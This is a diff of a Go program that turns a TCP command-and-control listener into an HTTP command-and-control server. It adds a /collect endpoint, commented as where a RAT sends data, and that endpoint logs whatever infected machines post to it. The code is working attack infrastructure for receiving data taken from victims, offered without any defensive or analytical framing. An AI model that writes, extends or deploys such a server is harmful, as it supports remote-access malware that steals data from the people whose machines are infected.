@@ -1,35 +1,43 @@
 package main
 
 import (
+    "fmt"
+    "io"
     "log"
-    "net"
+    "net/http"
     "os"
+    "time"
 )
 
 func main() {
     port := os.Getenv("PORT")
     if port == "" {
-        port = "4444" // fallback for local testing
+        port = "8080"
     }
 
-    listener, err := net.Listen("tcp", ":"+port)
-    if err != nil {
-        log.Fatal("Failed to bind:", err)
-    }
-    log.Println("TCP C2 listening on :" + port)
+    http.HandleFunc("/", handleRoot)
+    http.HandleFunc("/collect", handleCollect) // RAT sends data here
 
-    for {
-        conn, err := listener.Accept()
-        if err != nil {
-            log.Println("Accept error:", err)
-            continue
-        }
-        go handleConnection(conn)
-    }
+    log.Println("HTTP C2 listening on :" + port)
+    log.Fatal(http.ListenAndServe(":"+port, nil))
 }
 
-func handleConnection(client net.Conn) {
-    defer client.Close()
-    log.Println("New connection from:", client.RemoteAddr())
-    client.Write([]byte("Connected to Render C2!\n"))
+func handleRoot(w http.ResponseWriter, r *http.Request) {
+    w.Write([]byte("C2 Server is Online\n"))
+}
+
+func handleCollect(w http.ResponseWriter, r *http.Request) {
+    if r.Method != "POST" {
+        http.Error(w, "Only POST allowed", 405)
+        return
+    }
+
+    body, err := io.ReadAll(r.Body)
+    if err != nil {
+        http.Error(w, "Read error", 400)
+        return
+    }
+
+    log.Printf("[!] Data Received from %s at %s:\n%s\n", r.RemoteAddr, time.Now().Format(time.RFC3339), string(body))
+    w.Write([]byte("Data received"))
 }
